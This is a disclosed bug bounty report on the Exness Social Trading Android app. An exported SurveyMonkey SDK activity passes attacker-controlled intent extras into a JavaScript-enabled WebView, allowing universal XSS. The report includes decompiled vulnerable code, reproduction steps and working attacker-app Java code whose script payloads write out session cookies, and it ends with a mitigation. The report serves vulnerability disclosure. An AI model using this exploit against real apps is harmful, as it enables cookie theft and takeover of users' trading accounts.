# Improper Implementation of SDK Allows Universal XSS in Webview Leading to Account Takeover

## Report Details
- **Report ID**: 1455987
- **URL**: https://hackerone.com/reports/1455987
- **State**: Closed
- **Severity**: low
- **Submitted**: 2022-01-20T23:38:30.545Z
- **Disclosed**: 2022-04-13T15:36:59.294Z

## Reporter
- **Username**: holyfield
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: exness

## Vulnerability Information
## Affected App: Social Trading (com.exness.investments)
## App Version: - 2.45.8-release (latest on PlayStore)

# Summary:
The **SurveyMonkey** SDK, used to collect surveys from users for analytic and informative purposes, was implemented in an insecure manner in . Particularly, the `SMFeedbackActivity` was exported, allowing any app installed on user's device to launch it. In the implementation details stated on Github (see References), it is expected that the SDK would be initialized programmatically and not via an exported activity. Nevertheless, this in itself does not make the app vulnerable.

The vulnerability surfaces because the exported activity, `SMFeedbackActivity`, is a Fragment which loads data into a WebView by supplying externally controlled `Intent Extras` into the `loadDataWithBaseURL()` method of the WebView. This method accepts a `baseURL` and `HTML` data as parameters and uses their values to load the WebView, with JavaScript enabled. The function of this method is that when a `baseURL` is supplied, the WebView treats the HTML content in the `HTML` data as though it's a content that was loaded when the `baseURL` was visited. For example, supplying `https://my.exness.com` as `baseURL` and `<script>document.write(document.cookies)</script>` would write out the cookies of `my.exness.com` stored in the app's internal storage. The same is applicable for all cookies stored for every other site visited through the various WebViews in the Social Trading app because all cookies are stored in a single file.

Therefore, a malicious app can start up the vulnerable activity--which is actually a fragment, being an extension of the `Fragment` super class--and supply the intent with malicious `Intent Extras` containing any website as well as JavaScript payload to steal user's Cookies or execute OSRF (On-Site Request Forgery) attacks.

Here's the vulnerable piece of code:
**AndroidManifest.xml**
**Desc:** The exported activity.

```xml
<activity android:name="com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackActivity" ...>
  <intent-filter>
      <action android:name="android.intent.action.MAIN"/>
  </intent-filter>
</activity>
```

**com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackActivity**
**Desc:** The last line `onCreate()` method launches the Fragment with attacker-supplied Intent Extras.

```java
@Override // androidx.fragment.app.FragmentActivity
public void onCreate(android.os.Bundle bundle) {
  super.onCreate(bundle);
  android.content.Intent intent = getIntent();
  this.f11369c = intent.getStringExtra("smSPageHTML");
  this.f11370d = intent.getStringExtra("smSPageURL");
  if (this.f11369c == null) {
    ...
  } else if (bundle == null) {
    ...
    android.os.Bundle bundle2 = new android.os.Bundle();
    bundle2.putString("smSPageURL", str);
    bundle2.putString("smSPageHTML", str2);
    bundle2.putBoolean("smHasLoadedSPageHTML", true);
    sMFeedbackFragment.setArguments(bundle2);
    beginTransaction.add(16908290, sMFeedbackFragment, com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackFragment.f11372p).commit();
  }
}
```

**com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackFragment**
**Desc:** After some bypassable validations of the URL, the attacker-data is loaded in WebView in `loadDataWithBaseURL()` below
```java
public class SMFeedbackFragment extends androidx.fragment.app.Fragment implements p000.AbstractC8582mU{
	...

	public final void m4704b() {
    if (getView() != null) {
      this.f11382n = android.app.ProgressDialog.show(getActivity(), null, getString(com.surveymonkey.surveymonkeyandroidsdk.R$string.sm_loading_status));
      this.f11376g = true;
      this.f11373c = (android.webkit.WebView) getView().findViewById(com.surveymonkey.surveymonkeyandroidsdk.R$id.sm_feedback_webview);
      this.f11373c.getSettings().setJavaScriptEnabled(true);
      this.f11373c.setWebViewClient(new com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackFragment.C7006c(null));
      this.f11373c.loadDataWithBaseURL(this.smSPageURL, this.smSPageHTML, null, "UTF-8", null);
    }
  }
  ...
}
```

# Steps to Reproduce:

  1. Install the latest version of Social Trading (com.exness.investments) from Play Store.
  2. Install the attacker App attached to this report
  3. Launch the attacker's app
  4. The Exness Trading App will open up. After a few seconds, the vulnerable Fragment will be launched, loading `my.exness.asia`.
  5. After a few more seconds, the Fragment will be relaunched with attacker's payload to show the user's cookies.
  6. You'll see the user's cookies exposed, and if the user had also logged to any other Website, e.g., through the Payments WebView, the same exploit still works.

**Exploit Code In Attacker App**
```java
Intent exnessIntent = getPackageManager().getLaunchIntentForPackage("com.exness.investments");
startActivity(exnessIntent);
final Intent intent = new Intent("android.intent.action.VIEW");
intent.putExtra("smSPageHTML", "<h1>Exploited</h1><script>location.href='/r/'</script>");
intent.putExtra("smSPageURL", "https://my.exness.asia/r/");
try {
    intent.setClassName(createPackageContext("com.exness.investments", Context.CONTEXT_IGNORE_SECURITY), "com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackActivity");
} catch (PackageManager.NameNotFoundException e) {
    e.printStackTrace();
}
new Handler().postDelayed(new Runnable() {
    @Override
    public void run() {
        startActivity(intent);
    }
}, 8000);

final Intent intent2 = new Intent("android.intent.action.VIEW");
intent2.putExtra("smSPageHTML", "<h1<Exploited</h1><script>document.write(document.cookie)</script>");
intent2.putExtra("smSPageURL", "https://my.exness.asia/r/");
try {
    intent2.setClassName(createPackageContext("com.exness.investments", Context.CONTEXT_IGNORE_SECURITY), "com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackActivity");
} catch (PackageManager.NameNotFoundException e) {
    e.printStackTrace();
}

new Handler().postDelayed(new Runnable() {
    @Override
    public void run() {
        startActivity(intent2);
    }
}, 20000);
```

If a user had logged in to any site using any WebView controlled by the Exness app, as would be seen below, the user's account can be hijacked through theft of the user's `JWT` token.

Here's a short video PoC

█████████

## Impact

* Theft of user cookies for all sites which would lead to account takeovers
* Attacker would compromise victim's credentials and data
* Attacker would see victim's open and closed positions and also make unfavorable modifications
* Attacker would be able to change victim's strategies and portfolios, leading to losses
* Attacker could make withdrawals from victim's account, especially if 2FA through phone number is enabled in the Exness app and the Attaking

## Mitigation
The exported activity should not be exported. Adding `exported="false"` to the activity would ensure a third-party app would not be able to launch it.


## Supporting Material/References:

  * Attacker App - ██████████
  * Video PoC - █████
  * [Implementation details of Survey Monkey Android SDK](https://github.com/SurveyMonkey/surveymonkey-android-sdk/)

## Attachments
No attachments
